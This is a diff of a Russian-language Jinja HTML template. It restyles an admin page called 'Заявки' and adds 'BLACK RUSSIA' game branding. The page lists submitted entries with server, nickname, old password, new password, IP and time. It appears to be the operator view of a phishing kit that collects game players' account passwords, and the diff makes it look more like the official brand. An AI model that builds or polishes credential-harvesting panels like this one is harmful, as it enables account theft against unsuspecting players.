@@ -3,52 +3,85 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Заявки</title>
+<title>Заявки — BLACK RUSSIA</title>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    background: #1a1410;
-    color: #e8dcc8;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    padding: 24px 16px;
+    background: #0e0e0e;
+    color: #ffffff;
+    font-family: 'Montserrat', -apple-system, sans-serif;
+    min-height: 100vh;
+    padding: 0 0 40px;
+    background-image:
+      radial-gradient(ellipse at 50% 0%, rgba(255,60,0,0.08), transparent 60%),
+      linear-gradient(180deg, #141414 0%, #0a0a0a 100%);
   }
-  .wrap { max-width: 600px; margin: 0 auto; }
+  .header {
+    display: flex;
+    align-items: center;
+    padding: 14px 20px;
+    border-bottom: 1px solid rgba(255,255,255,0.06);
+    background: rgba(10,10,10,0.6);
+  }
+  .header img { height: 42px; width: 42px; object-fit: contain; margin-right: 12px; }
+  .header .title { display: flex; flex-direction: column; line-height: 1; }
+  .header .title .b { color: #ff4400; font-weight: 900; font-size: 17px; letter-spacing: 1.2px; }
+  .header .title .r { color: #ffffff; font-weight: 900; font-size: 17px; letter-spacing: 1.2px; }
+  .wrap { max-width: 620px; margin: 0 auto; padding: 24px 20px 0; }
   h1 {
-    color: #ff8c00;
-    font-size: 20px;
+    font-size: 18px;
+    font-weight: 800;
+    text-transform: uppercase;
+    letter-spacing: 1px;
     margin-bottom: 20px;
+    color: #ff4400;
   }
   .card {
-    background: #241a12;
-    border: 1px solid #3a2a1c;
-    border-left: 3px solid #ff8c00;
-    border-radius: 12px;
-    padding: 16px;
+    background: linear-gradient(180deg, #1a1a1a 0%, #151515 100%);
+    border: 1px solid rgba(255,255,255,0.07);
+    border-left: 3px solid #ff4400;
+    border-radius: 14px;
+    padding: 18px;
     margin-bottom: 12px;
     font-size: 14px;
-    line-height: 1.7;
+    line-height: 1.8;
+    font-weight: 500;
   }
-  .k { color: #8a7a68; }
-  .v { color: #e8dcc8; }
-  .empty { color: #8a7a68; text-align: center; padding: 40px; }
+  .k { color: #7a7a7a; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .v { color: #ffffff; font-weight: 700; margin-left: 6px; }
+  .empty {
+    color: #7a7a7a;
+    text-align: center;
+    padding: 60px 20px;
+    font-size: 14px;
+  }
 </style>
 </head>
 <body>
-<div class="wrap">
-  <h1>Заявки: {{ count }}</h1>
-
-  {% for t in tickets %}
-    <div class="card">
-      <div><span class="k">Сервер:</span> <span class="v">{{ t.server }}</span></div>
-      <div><span class="k">Ник:</span> <span class="v">{{ t.nick }}</span></div>
-      <div><span class="k">Старый пароль:</span> <span class="v">{{ t.old_password }}</span></div>
-      <div><span class="k">Новый пароль:</span> <span class="v">{{ t.new_password }}</span></div>
-      <div><span class="k">IP:</span> <span class="v">{{ t.ip }}</span></div>
-      <div><span class="k">Время:</span> <span class="v">{{ t.time }}</span></div>
+  <div class="header">
+    <img src="https://i.postimg.cc/y86F1KVm/images-(9).jpg" alt="BR">
+    <div class="title">
+      <span class="b">BLACK</span>
+      <span class="r">RUSSIA</span>
     </div>
-  {% else %}
-    <div class="empty">Пусто.</div>
-  {% endfor %}
-</div>
+  </div>
+
+  <div class="wrap">
+    <h1>Заявки: {{ count }}</h1>
+
+    {% for t in tickets %}
+      <div class="card">
+        <div><span class="k">Сервер:</span><span class="v">{{ t.server }}</span></div>
+        <div><span class="k">Ник:</span><span class="v">{{ t.nick }}</span></div>
+        <div><span class="k">Старый пароль:</span><span class="v">{{ t.old_password }}</span></div>
+        <div><span class="k">Новый пароль:</span><span class="v">{{ t.new_password }}</span></div>
+        <div><span class="k">IP:</span><span class="v">{{ t.ip }}</span></div>
+        <div><span class="k">Время:</span><span class="v">{{ t.time }}</span></div>
+      </div>
+    {% else %}
+      <div class="empty">Пусто.</div>
+    {% endfor %}
+  </div>
 </body>
 </html>
